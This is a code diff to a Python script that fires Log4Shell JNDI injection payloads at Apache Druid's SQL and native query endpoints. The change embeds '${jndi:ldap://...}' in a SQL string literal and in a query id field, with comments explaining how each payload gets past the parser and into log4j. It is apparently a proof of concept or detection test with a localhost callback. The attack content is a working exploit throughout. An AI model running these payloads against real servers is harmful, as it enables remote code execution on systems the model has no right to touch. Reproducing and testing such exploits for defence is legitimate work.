@@ -23,19 +23,34 @@ TRIGGERED = threading.Event()
 
 def send_payload(base_url: str):
     """Send the Log4Shell payload across multiple Druid endpoints."""
-    payload = f"${{jndi:ldap://127.0.0.1:1389/o=reference}}"
-
-    # Give the listener a moment to bind before sending.
-    time.sleep(0.5)
+    jndi = "${jndi:ldap://127.0.0.1:1389/o=reference}"
 
     endpoints = [
-        # 1. SQL query text — logged by QueryLifecycle via log4j (%m pattern)
+        # SQL string literal — wrapping in single quotes makes it valid SQL so
+        # the query passes Druid's parser and reaches LoggingRequestLogger,
+        # which calls LOG.info("%s", line) with the full query JSON.
+        # log4j evaluates ${jndi:...} inside that message string.
         {
             "method": "POST",
             "url": base_url + "/druid/v2/sql",
             "headers": {"Content-Type": "application/json"},
-            "json": {"query": payload},
-            "desc": "SQL query body",
+            "json": {"query": f"SELECT '{jndi}'"},
+            "desc": "SQL string literal",
+        },
+        # Native query with payload in id field — logged on query completion.
+        {
+            "method": "POST",
+            "url": base_url + "/druid/v2/",
+            "headers": {"Content-Type": "application/json"},
+            "json": {
+                "queryType": "timeseries",
+                "dataSource": "nonexistent",
+                "granularity": "all",
+                "intervals": ["2000-01-01/2000-01-02"],
+                "aggregations": [{"type": "count", "name": "count"}],
+                "id": jndi,
+            },
+            "desc": "native query id field",
         },
     ]
 
@@ -49,10 +64,6 @@ def send_payload(base_url: str):
                 requests.get(ep["url"], headers=ep["headers"], timeout=5)
         except requests.exceptions.RequestException as e:
             print(f"    [~] {e}")
-
-        # Stop as soon as callback is received.
-        if TRIGGERED.wait(timeout=2):
-            break
 
 
 def main():
